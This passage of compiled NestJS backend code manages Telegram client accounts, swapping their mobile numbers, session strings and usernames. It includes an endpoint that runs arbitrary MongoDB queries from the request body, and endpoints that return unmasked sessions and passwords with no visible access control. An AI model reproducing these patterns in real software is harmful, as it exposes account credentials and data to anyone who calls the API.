    (0, swagger_1.ApiOperation)({ summary: 'Search clients by promote mobile numbers' }),
    (0, swagger_1.ApiQuery)({ name: 'mobile', required: true, description: 'Promote mobile number to search for' }),
    (0, swagger_1.ApiResponse)({
        description: 'Clients with matching promote mobiles returned successfully.',
        type: Object,
        schema: {
            properties: {
                clients: { type: 'array', items: { $ref: '#/components/schemas/Client' } },
                matches: { type: 'array', items: { type: 'object', properties: { clientId: { type: 'string' }, mobile: { type: 'string' } } } },
                searchedMobile: { type: 'string' },
            },
        },
    }),
    __param(0, (0, common_1.Query)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "searchByPromoteMobile", null);
__decorate([
    (0, common_1.Get)('search/enhanced'),
    (0, swagger_1.ApiOperation)({ summary: 'Enhanced search with promote mobile support' }),
    (0, swagger_1.ApiQuery)({ name: 'promoteMobileNumber', required: false, description: 'Promote mobile number to search for' }),
    (0, swagger_1.ApiQuery)({ name: 'hasPromoteMobiles', required: false, description: 'Filter by clients that have promote mobiles (true/false)' }),
    (0, swagger_1.ApiResponse)({
        description: 'Enhanced search results with promote mobile context.',
        type: Object,
        schema: {
            properties: {
                clients: { type: 'array', items: { $ref: '#/components/schemas/Client' } },
                searchType: { type: 'string' },
                promoteMobileMatches: { type: 'array', items: { type: 'object', properties: { clientId: { type: 'string' }, mobile: { type: 'string' } } } },
                totalResults: { type: 'number' },
            },
        },
    }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "enhancedSearch", null);
__decorate([
    (0, common_1.Get)('updateClient/:clientId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get user data by ID' }),
    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'Client ID' }),
    (0, swagger_1.ApiResponse)({ description: 'Return the user data.', type: String }),
    __param(0, (0, common_1.Param)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "updateClient", null);
__decorate([
    (0, common_1.Get)('maskedCls'),
    (0, common_1.UseInterceptors)(interceptors_1.CloudflareCacheInterceptor),
    (0, decorators_1.CloudflareCache)(3600, 60),
    (0, swagger_1.ApiOperation)({ summary: 'Get all user data with masked fields' }),
    (0, swagger_1.ApiResponse)({ description: 'All user data returned successfully.', type: [client_schema_1.Client] }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "findAllMasked", null);
__decorate([
    (0, common_1.Get)('maskedCls/:clientId'),
    (0, common_1.UseInterceptors)(interceptors_1.CloudflareCacheInterceptor),
    (0, decorators_1.CloudflareCache)(3600, 60),
    (0, swagger_1.ApiOperation)({ summary: 'Get user data with masked fields by ID' }),
    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'Client ID' }),
    (0, swagger_1.ApiResponse)({ description: 'User data returned successfully.', type: client_schema_1.Client }),
    __param(0, (0, common_1.Param)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "findOneMasked", null);
__decorate([
    (0, common_1.Get)(),
    (0, common_1.UseInterceptors)(interceptors_1.CloudflareCacheInterceptor),
    (0, decorators_1.CloudflareCache)(3600, 60),
    (0, swagger_1.ApiOperation)({ summary: 'Get all user data' }),
    (0, swagger_1.ApiResponse)({ description: 'All user data returned successfully.', type: [client_schema_1.Client] }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)(':clientId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get user data by ID' }),
    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'Client ID' }),
    (0, swagger_1.ApiResponse)({ description: 'User data returned successfully.', type: client_schema_1.Client }),
    __param(0, (0, common_1.Param)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':clientId'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' }),
    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'Client ID' }),
    (0, swagger_1.ApiBody)({ type: update_client_dto_1.UpdateClientDto }),
    (0, swagger_1.ApiResponse)({ description: 'The user data has been successfully updated.', type: client_schema_1.Client }),
    __param(0, (0, common_1.Param)('clientId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_client_dto_1.UpdateClientDto]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':clientId'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete user data by ID' }),
    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'Client ID' }),
    (0, swagger_1.ApiResponse)({ description: 'The user data has been successfully deleted.', type: client_schema_1.Client }),
    __param(0, (0, common_1.Param)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "remove", null);
__decorate([
    (0, common_1.Post)('query'),
    (0, swagger_1.ApiOperation)({ summary: 'Execute a custom MongoDB query' }),
    (0, swagger_1.ApiBody)({
        schema: {
            properties: {
                query: { type: 'object' },
                sort: { type: 'object' },
                limit: { type: 'number' },
                skip: { type: 'number' },
            },
        },
    }),
    (0, swagger_1.ApiResponse)({ description: 'Query executed successfully.' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "executeQuery", null);
__decorate([
    (0, common_1.Patch)(':clientId/promoteMobile/add'),
    (0, swagger_1.ApiOperation)({ summary: 'Add a mobile number as a promote mobile for a specific client' }),
    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'The unique identifier of the client' }),
    (0, swagger_1.ApiBody)({
        schema: {
            properties: {
                mobileNumber: { type: 'string', example: '916265240911' },
            },
        },
    }),
    (0, swagger_1.ApiResponse)({ description: 'Mobile number assigned as promote mobile successfully.', type: client_schema_1.Client }),
    __param(0, (0, common_1.Param)('clientId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "addPromoteMobile", null);
__decorate([
    (0, common_1.Patch)(':clientId/promoteMobile/remove'),
    (0, swagger_1.ApiOperation)({ summary: 'Remove a promote mobile assignment from a specific client' }),
    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'The unique identifier of the client' }),
    (0, swagger_1.ApiBody)({
        schema: {
            properties: {
                mobileNumber: { type: 'string', example: '916265240911' },
            },
        },
    }),
    (0, swagger_1.ApiResponse)({ description: 'Promote mobile assignment removed successfully.', type: client_schema_1.Client }),
    __param(0, (0, common_1.Param)('clientId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "removePromoteMobile", null);
exports.ClientController = ClientController = __decorate([
    (0, swagger_1.ApiTags)('Clients'),
    (0, common_1.Controller)('clients'),
    __metadata("design:paramtypes", [client_service_1.ClientService])
], ClientController);


/***/ }),

/***/ "./src/components/clients/client.module.ts":
/*!*************************************************!*\
  !*** ./src/components/clients/client.module.ts ***!
  \*************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ClientModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const client_schema_1 = __webpack_require__(/*! ./schemas/client.schema */ "./src/components/clients/schemas/client.schema.ts");
const client_service_1 = __webpack_require__(/*! ./client.service */ "./src/components/clients/client.service.ts");
const client_controller_1 = __webpack_require__(/*! ./client.controller */ "./src/components/clients/client.controller.ts");
const Telegram_module_1 = __webpack_require__(/*! ../Telegram/Telegram.module */ "./src/components/Telegram/Telegram.module.ts");
const buffer_client_module_1 = __webpack_require__(/*! ../buffer-clients/buffer-client.module */ "./src/components/buffer-clients/buffer-client.module.ts");
const users_module_1 = __webpack_require__(/*! ../users/users.module */ "./src/components/users/users.module.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
const npoint_module_1 = __webpack_require__(/*! ../n-point/npoint.module */ "./src/components/n-point/npoint.module.ts");
const timestamp_module_1 = __webpack_require__(/*! ../timestamps/timestamp.module */ "./src/components/timestamps/timestamp.module.ts");
const session_manager_1 = __webpack_require__(/*! ../session-manager */ "./src/components/session-manager/index.ts");
const promote_client_module_1 = __webpack_require__(/*! ../promote-clients/promote-client.module */ "./src/components/promote-clients/promote-client.module.ts");
const promote_clients_1 = __webpack_require__(/*! ../promote-clients */ "./src/components/promote-clients/index.ts");
let ClientModule = class ClientModule {
};
exports.ClientModule = ClientModule;
exports.ClientModule = ClientModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ name: client_schema_1.Client.name, schema: client_schema_1.ClientSchema }]),
            mongoose_1.MongooseModule.forFeature([{ name: promote_clients_1.PromoteClient.name, schema: promote_clients_1.PromoteClientSchema, collection: 'promoteClients' }]),
            (0, common_1.forwardRef)(() => Telegram_module_1.TelegramModule),
            (0, common_1.forwardRef)(() => buffer_client_module_1.BufferClientModule),
            (0, common_1.forwardRef)(() => users_module_1.UsersModule),
            (0, common_1.forwardRef)(() => session_manager_1.SessionModule),
            (0, common_1.forwardRef)(() => timestamp_module_1.TimestampModule),
            (0, common_1.forwardRef)(() => promote_client_module_1.PromoteClientModule),
            npoint_module_1.NpointModule
        ],
        controllers: [client_controller_1.ClientController],
        providers: [client_service_1.ClientService],
        exports: [client_service_1.ClientService, mongoose_1.MongooseModule]
    })
], ClientModule);


/***/ }),

/***/ "./src/components/clients/client.service.ts":
/*!**************************************************!*\
  !*** ./src/components/clients/client.service.ts ***!
  \**************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
var ClientService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ClientService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const client_schema_1 = __webpack_require__(/*! ./schemas/client.schema */ "./src/components/clients/schemas/client.schema.ts");
const buffer_client_service_1 = __webpack_require__(/*! ../buffer-clients/buffer-client.service */ "./src/components/buffer-clients/buffer-client.service.ts");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const users_service_1 = __webpack_require__(/*! ../users/users.service */ "./src/components/users/users.service.ts");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
const cloudinary_1 = __webpack_require__(/*! ../../cloudinary */ "./src/cloudinary.ts");
const parseError_1 = __webpack_require__(/*! ../../utils/parseError */ "./src/utils/parseError.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const logbots_1 = __webpack_require__(/*! ../../utils/logbots */ "./src/utils/logbots.ts");
const connection_manager_1 = __webpack_require__(/*! ../Telegram/utils/connection-manager */ "./src/components/Telegram/utils/connection-manager.ts");
const promote_client_schema_1 = __webpack_require__(/*! ../promote-clients/schemas/promote-client.schema */ "./src/components/promote-clients/schemas/promote-client.schema.ts");
const path_1 = __importDefault(__webpack_require__(/*! path */ "path"));
const tl_1 = __webpack_require__(/*! telegram/tl */ "telegram/tl");
const isPermanentError_1 = __importDefault(__webpack_require__(/*! ../../utils/isPermanentError */ "./src/utils/isPermanentError.ts"));
const Telegram_service_1 = __webpack_require__(/*! ../Telegram/Telegram.service */ "./src/components/Telegram/Telegram.service.ts");
const checkMe_utils_1 = __webpack_require__(/*! ../../utils/checkMe.utils */ "./src/utils/checkMe.utils.ts");
const CONFIG = {
    REFRESH_INTERVAL: 5 * 60 * 1000,
    CACHE_TTL: 10 * 60 * 1000,
    MAX_RETRIES: 3,
    RETRY_DELAY: 1000,
    CACHE_WARMUP_THRESHOLD: 20,
    COOLDOWN_PERIOD: 240000,
    UPDATE_CLIENT_COOLDOWN: 30000,
    PHOTO_PATHS: ['dp1.jpg', 'dp2.jpg', 'dp3.jpg'],
};
let ClientService = ClientService_1 = class ClientService {
    constructor(clientModel, promoteClientModel, telegramService, bufferClientService, usersService) {
        this.clientModel = clientModel;
        this.promoteClientModel = promoteClientModel;
        this.telegramService = telegramService;
        this.bufferClientService = bufferClientService;
        this.usersService = usersService;
        this.logger = new utils_1.Logger(ClientService_1.name);
        this.lastUpdateMap = new Map();
        this.setupCooldownMap = new Map();
        this.clientsMap = new Map();
        this.cacheMetadata = { lastUpdated: 0, isStale: true };
        this.checkInterval = null;
        this.refreshInterval = null;
        this.isInitialized = false;
        this.isShuttingDown = false;
        this.refreshPromise = null;
    }
    async onModuleInit() {
        try {
            await this.refreshCacheFromDatabase();
            this.startPeriodicTasks();
            this.isInitialized = true;
        }
        catch (e) {
            (0, parseError_1.parseError)(e, 'Failed to initialize Client Service');
        }
    }
    async onModuleDestroy() {
        this.isShuttingDown = true;
        try {
            if (this.checkInterval)
                clearInterval(this.checkInterval);
            if (this.refreshInterval)
                clearInterval(this.refreshInterval);
            if (this.refreshPromise)
                await this.refreshPromise;
            await connection_manager_1.connectionManager.shutdown();
            this.clientsMap.clear();
        }
        catch (e) {
            (0, parseError_1.parseError)(e, 'Error during Client Service shutdown');
        }
    }
    startPeriodicTasks() {
        this.checkInterval = setInterval(async () => {
            if (this.isShuttingDown)
                return;
            await this.performPeriodicRefresh();
        }, CONFIG.REFRESH_INTERVAL);
        this.refreshInterval = setInterval(() => {
            if (this.isShuttingDown)
                return;
            this.updateCacheMetadata();
        }, 60000);
    }
    async performPeriodicRefresh() {
        if (this.refreshPromise) {
            this.logger.debug('Refresh already in progress, skipping...');
            return;
        }
        this.refreshPromise = this.refreshCacheFromDatabase();
        try {
            await this.refreshPromise;
        }
        finally {
            this.refreshPromise = null;
        }
    }
    updateCacheMetadata() {
        this.cacheMetadata.isStale = Date.now() - this.cacheMetadata.lastUpdated > CONFIG.CACHE_TTL;
    }
    async refreshCacheFromDatabase() {
        try {
            const documents = await this.executeWithRetry(() => this.clientModel.find({}, { _id: 0, updatedAt: 0 }).lean().exec());
            const newClientsMap = new Map();
            documents.forEach((client) => newClientsMap.set(client.clientId, client));
            this.clientsMap = newClientsMap;
            this.cacheMetadata = { lastUpdated: Date.now(), isStale: false };
        }
        catch (e) {
            (0, parseError_1.parseError)(e, 'Failed to refresh clients cache from database', true);
        }
    }
    async create(createClientDto) {
        try {
            const createdClient = await this.executeWithRetry(() => {
                const client = new this.clientModel(createClientDto);
                return client.save();
            });
            this.clientsMap.set(createdClient.clientId, createdClient.toObject());
            this.logger.log(`Client created: ${createdClient.clientId}`);
            return createdClient;
        }
        catch (error) {
            const errorDetails = (0, parseError_1.parseError)(error, `Failed to create client | mobile: ${createClientDto.mobile}`);
            throw new common_1.BadRequestException(errorDetails.message);
        }
    }
    async findAll() {
        this.ensureInitialized();
        if (this.clientsMap.size >= CONFIG.CACHE_WARMUP_THRESHOLD &&
            !this.cacheMetadata.isStale) {
            this.logger.debug(`Retrieved ${this.clientsMap.size} clients from cache`);
            return Array.from(this.clientsMap.values());
        }
        await this.refreshCacheFromDatabase();
        return Array.from(this.clientsMap.values());
    }
    async findAllMasked() {
        const clients = await this.findAll();
        return clients.map(({ session, mobile, password, ...maskedClient }) => maskedClient);
    }
    async findOneMasked(clientId) {
        const client = await this.findOne(clientId, true);
        const { session, mobile, password, ...maskedClient } = client;
        return maskedClient;
    }
    async findAllObject() {
        const clients = await this.findAll();
        return clients.reduce((acc, client) => {
            acc[client.clientId] = client;
            return acc;
        }, {});
    }
    async findAllMaskedObject(query) {
        const filteredClients = query ? (await this.enhancedSearch(query)).clients : await this.findAll();
        return filteredClients.reduce((acc, client) => {
            const { session, mobile, password, ...maskedClient } = client;
            acc[client.clientId] = { clientId: client.clientId, ...maskedClient };
            return acc;
        }, {});
    }
    async refreshMap() {
        this.logger.log('Manual cache refresh requested');
        await this.refreshCacheFromDatabase();
    }
    async findOne(clientId, throwErr = true) {
        this.ensureInitialized();
        const cachedClient = this.clientsMap.get(clientId);
        if (cachedClient)
            return cachedClient;
        const client = await this.executeWithRetry(() => this.clientModel.findOne({ clientId }, { _id: 0, updatedAt: 0 }).lean().exec());
        if (!client && throwErr) {
            throw new common_1.NotFoundException(`Client with ID "${clientId}" not found`);
        }
        if (client)
            this.clientsMap.set(clientId, client);
        return client;
    }
    async update(clientId, updateClientDto) {
        this.ensureInitialized();
        try {
            const cleanUpdateDto = this.cleanUpdateObject(updateClientDto);
            await this.notifyClientUpdate(clientId);
            const updatedClient = await this.executeWithRetry(() => this.clientModel
                .findOneAndUpdate({ clientId }, { $set: cleanUpdateDto }, { new: true, upsert: true, runValidators: true })
                .lean()
                .exec());
            if (!updatedClient) {
                throw new common_1.NotFoundException(`Client with ID "${clientId}" not found`);
            }
            this.clientsMap.set(clientId, updatedClient);
            this.performPostUpdateTasks(updatedClient);
            this.logger.log(`Client updated: ${clientId}`);
            return updatedClient;
        }
        catch (error) {
            const errorDetails = (0, parseError_1.parseError)(error, `Failed to update client ${clientId} | mobile: ${updateClientDto.mobile || 'N/A'}`);
            throw new common_1.BadRequestException(errorDetails.message);
        }
    }
    async remove(clientId) {
        this.ensureInitialized();
        try {
            const deletedClient = await this.executeWithRetry(() => this.clientModel.findOneAndDelete({ clientId }).lean().exec());
            if (!deletedClient) {
                throw new common_1.NotFoundException(`Client with ID "${clientId}" not found`);
            }
            this.clientsMap.delete(clientId);
            this.logger.log(`Client removed: ${clientId}`);
            return deletedClient;
        }
        catch (error) {
            const errorDetails = (0, parseError_1.parseError)(error, `Failed to remove client ${clientId}`);
            throw new common_1.InternalServerErrorException(errorDetails.message);
        }
        // removed by dead control flow

    }
    async search(filter) {
        try {
            if (filter.hasPromoteMobiles !== undefined) {
                filter = await this.processPromoteMobileFilter(filter);
            }
            filter = this.processTextSearchFields(filter);
            return this.executeWithRetry(() => this.clientModel.find(filter).lean().exec());
        }
        catch (error) {
            const errorDetails = (0, parseError_1.parseError)(error, `Failed to search clients with filter ${JSON.stringify(filter)}`);
            throw new common_1.InternalServerErrorException(errorDetails.message);
        }
    }
    async searchClientsByPromoteMobile(mobileNumbers) {
        if (!Array.isArray(mobileNumbers) || mobileNumbers.length === 0)
            return [];
        const promoteClients = await this.executeWithRetry(() => this.promoteClientModel
            .find({ mobile: { $in: mobileNumbers }, clientId: { $exists: true } })
            .lean()
            .exec());
        const clientIds = [...new Set(promoteClients.map((pc) => pc.clientId))];
        return this.executeWithRetry(() => this.clientModel.find({ clientId: { $in: clientIds } }).lean().exec());
    }
    async enhancedSearch(filter) {
        try {
            let searchType = 'direct';
            let promoteMobileMatches = [];
            if (filter.promoteMobileNumber) {
                searchType = 'promoteMobile';
                const mobileNumber = filter.promoteMobileNumber;
                delete filter.promoteMobileNumber;
                const promoteClients = await this.executeWithRetry(() => this.promoteClientModel
                    .find({
                    mobile: { $regex: new RegExp(this.escapeRegex(mobileNumber), 'i') },
                    clientId: { $exists: true },
                })
                    .lean()
                    .exec());
                promoteMobileMatches = promoteClients.map((pc) => ({
                    clientId: pc.clientId,
                    mobile: pc.mobile,
                }));
                filter.clientId = { $in: promoteClients.map((pc) => pc.clientId) };
            }
            const clients = await this.search(filter);
            return {
                clients,
                searchType,
                promoteMobileMatches: promoteMobileMatches.length > 0 ? promoteMobileMatches : undefined,
            };
        }
        catch (error) {
            const errorDetails = (0, parseError_1.parseError)(error, `Failed to perform enhanced search with filter ${JSON.stringify(filter)}`);
            throw new common_1.InternalServerErrorException(errorDetails.message);
        }
    }
    ensureInitialized() {
        if (!this.isInitialized) {
            throw new Error('Service not initialized. Please wait for initialization to complete.');
        }
    }
    cleanUpdateObject(updateDto) {
        const cleaned = { ...updateDto };
        delete cleaned._id;
        if (cleaned._doc) {
            delete cleaned._doc._id;
            delete cleaned._doc;
        }
        return cleaned;
    }
    async notifyClientUpdate(clientId) {
        await this.notify(`Updating the Existing client: ${clientId}`);
    }
    async notify(message) {
        try {
            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(message)}`, {
                timeout: 5000,
            });
        }
        catch (error) {
            this.logger.warn('Failed to send notification', error.message);
        }
    }
    performPostUpdateTasks(updatedClient) {
        setImmediate(async () => {
            try {
                this.refreshExternalMaps();
            }
            catch (error) {
                (0, parseError_1.parseError)(error, 'Failed to refresh external maps after client update');
            }
        });
    }
    async refreshExternalMaps() {
        await Promise.allSettled([
            (0, fetchWithTimeout_1.fetchWithTimeout)(`${process.env.uptimeChecker}/refreshmap`, { timeout: 5000 }),
            (0, fetchWithTimeout_1.fetchWithTimeout)(`${process.env.uptimebot}/refreshmap`, { timeout: 5000 }),
        ]);
        this.logger.debug('External maps refreshed');
    }
    async processPromoteMobileFilter(filter) {
        const hasPromoteMobiles = filter.hasPromoteMobiles.toLowerCase() === 'true';
        delete filter.hasPromoteMobiles;
        const clientsWithPromoteMobiles = await this.executeWithRetry(() => this.promoteClientModel.find({ clientId: { $exists: true } }).distinct('clientId').lean());
        filter.clientId = hasPromoteMobiles
            ? { $in: clientsWithPromoteMobiles }
            : { $nin: clientsWithPromoteMobiles };
        return filter;
    }
    processTextSearchFields(filter) {
        const textFields = ['firstName', 'name'];
        textFields.forEach((field) => {
            if (filter[field]) {
                filter[field] = { $regex: new RegExp(this.escapeRegex(filter[field]), 'i') };
            }
        });
        return filter;
    }
    escapeRegex(text) {
        return text.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    }
    async executeWithRetry(operation, retries = CONFIG.MAX_RETRIES) {
        for (let attempt = 1; attempt <= retries; attempt++) {
            try {
                return await operation();
            }
            catch (error) {
                this.logger.warn(`Operation failed on attempt ${attempt}/${retries}`, error.message);
                if (attempt === retries)
                    throw error;
                const delay = CONFIG.RETRY_DELAY * Math.pow(2, attempt - 1);
                await this.sleep(delay);
            }
        }
        throw new Error('All retry attempts failed');
    }
    sleep(ms) {
        return new Promise((resolve) => setTimeout(resolve, ms));
    }
    getServiceStatus() {
        return {
            isInitialized: this.isInitialized,
            cacheSize: this.clientsMap.size,
            lastCacheUpdate: new Date(this.cacheMetadata.lastUpdated),
            isCacheStale: this.cacheMetadata.isStale,
            isShuttingDown: this.isShuttingDown,
        };
    }
    async getCacheStatistics() {
        const totalClients = await this.clientModel.countDocuments().exec();
        return {
            totalClients,
            cacheHitRate: this.clientsMap.size > 0 ? (this.clientsMap.size / totalClients) * 100 : 0,
            lastRefresh: new Date(this.cacheMetadata.lastUpdated),
            memoryUsage: process.memoryUsage().heapUsed / 1024 / 1024,
        };
    }
    async setupClient(clientId, setupClientQueryDto) {
        this.logger.log(`Received New Client Request for - ${clientId}`);
        if (!(0, utils_1.toBoolean)(process.env.AUTO_CLIENT_SETUP)) {
            this.logger.log('Auto client setup disabled');
            return;
        }
        if (!this.canSetupClient(clientId)) {
            this.logger.log(`Profile Setup Recently tried for ${clientId}, wait ::`, (0, utils_1.getReadableTimeDifference)(this.setupCooldownMap.get(clientId)));
            return;
        }
        await this.handleSetupClient(clientId, setupClientQueryDto);
    }
    canSetupClient(clientId) {
        const lastSetup = this.setupCooldownMap.get(clientId) || 0;
        return Date.now() > lastSetup + CONFIG.COOLDOWN_PERIOD;
    }
    async handleSetupClient(clientId, setupClientQueryDto) {
        this.setupCooldownMap.set(clientId, Date.now());
        const existingClient = await this.findOne(clientId);
        if (!existingClient) {
            this.logger.error(`Client not found: ${clientId}`);
            return;
        }
        const existingClientMobile = existingClient.mobile;
        this.logger.log('setupClientQueryDto:', setupClientQueryDto);
        const today = new Date().toISOString().split('T')[0];
        const query = {
            clientId,
            mobile: { $ne: existingClientMobile },
            createdAt: { $lte: new Date(Date.now() - 15 * 24 * 60 * 60 * 1000) },
            availableDate: { $lte: today },
            channels: { $gt: 200 },
            status: "active"
        };
        const newBufferClient = (await this.bufferClientService.executeQuery(query, { tgId: 1 }))[0];
        if (!newBufferClient) {
            await this.notify(`Buffer Clients not available, Requested by ${clientId}`);
            this.logger.log('Buffer Clients not available');
            return;
        }
        try {
            await this.notify(`Received New Client Request for - ${clientId}\nOldNumber: ${existingClient.mobile}\nOldUsername: @${existingClient.username}`);
            this.telegramService.setActiveClientSetup({
                ...setupClientQueryDto,
                clientId,
                existingMobile: existingClientMobile,
                newMobile: newBufferClient.mobile,
            });
            await connection_manager_1.connectionManager.getClient(newBufferClient.mobile);
            await this.updateClientSession(newBufferClient.session);
        }
        catch (error) {
            await this.notify(`Failed to setup new Client for - ${clientId}\nOldNumber: ${existingClient.mobile}\nError: ${error.message}`);
            const availableDate = new Date(Date.now() + 3 * 24 * 60 * 60 * 1000).toISOString().split('T')[0];
            await this.bufferClientService.createOrUpdate(newBufferClient.mobile, { availableDate });
            this.telegramService.setActiveClientSetup(undefined);
        }
        finally {
            await connection_manager_1.connectionManager.unregisterClient(newBufferClient.mobile);
        }
    }
    async updateClientSession(newSession) {
        const setup = this.telegramService.getActiveClientSetup();
        const { days, archiveOld, clientId, existingMobile, formalities, newMobile } = setup;
        this.logger.log('Updating Client Session');
        await (0, Helpers_1.sleep)(2000);
        const existingClient = await this.findOne(clientId);
        if (!existingClient)
            throw new common_1.NotFoundException(`Client ${clientId} not found`);
        let newTelegramClient;
        try {
            newTelegramClient = await connection_manager_1.connectionManager.getClient(newMobile, {
                handler: true,
                autoDisconnect: false,
            });
        }
        catch (error) {
            const errorDetails = (0, parseError_1.parseError)(error, `Failed to get Telegram client for NewMobile: ${newMobile}`, true);
            if ((0, isPermanentError_1.default)(errorDetails)) {
                await this.bufferClientService.markAsInactive(newMobile, errorDetails.message);
            }
            throw error;
        }
        if (!newTelegramClient)
            throw new Error(`Failed to get Telegram client for NewMobile: ${newMobile}`);
        try {
            const me = await newTelegramClient.getMe();
            const updatedUsername = await this.telegramService.updateUsernameForAClient(newMobile, clientId, existingClient.name, me.username);
            await this.notify(`Updated username for NewNumber: ${newMobile}\noldUsername: @${me.username}\nNewUsername: @${updatedUsername}`);
            await this.update(clientId, { mobile: newMobile, username: updatedUsername, session: newSession });
            await (0, fetchWithTimeout_1.fetchWithTimeout)(existingClient.deployKey, {}, 1);
            setTimeout(() => this.updateClient(clientId, 'Delayed update after buffer removal'), 15000);
            await this.handleClientArchival(existingClient, existingMobile, formalities, archiveOld, days);
            await this.bufferClientService.update(newMobile, { inUse: true, lastUsed: new Date() });
            await this.notify('Update finished');
        }
        catch (error) {
            (0, parseError_1.parseError)(error, `[New: ${newMobile}] Error in updating client session`, true);
            throw error;
        }
        finally {
            await connection_manager_1.connectionManager.unregisterClient(newMobile);
            this.telegramService.setActiveClientSetup(undefined);
        }
    }
    async handleClientArchival(existingClient, existingMobile, formalities, archiveOld, days) {
        try {
            const existingClientUser = (await this.usersService.search({ mobile: existingMobile }))[0];
            if (!existingClientUser)
                return;
            if ((0, utils_1.toBoolean)(formalities)) {
                await this.handleFormalities(existingMobile);
            }
            else {
                this.logger.log('Formalities skipped');
            }
            if (archiveOld) {
                await this.archiveOldClient(existingClient, existingClientUser, existingMobile, days);
            }
            else {
                await this.bufferClientService.update(existingMobile, {
                    inUse: false,
                    lastUsed: new Date(),
                    status: 'inactive',
                });
                this.logger.log('Client Archive Skipped');
                await this.notify('Skipped Old Client Archival');
            }
        }
        catch (e) {
            const errorDetails = (0, parseError_1.parseError)(e, `Error in Archiving Old Client: ${existingMobile}`, false);
            if ((0, isPermanentError_1.default)(errorDetails)) {
                await this.bufferClientService.markAsInactive(existingMobile, e.errorMessage || e.message);
            }
            await this.notify(`Failed to Archive old Client: ${existingMobile}\nError: ${e.errorMessage || e.message}`);
        }
    }
    async handleFormalities(mobile) {
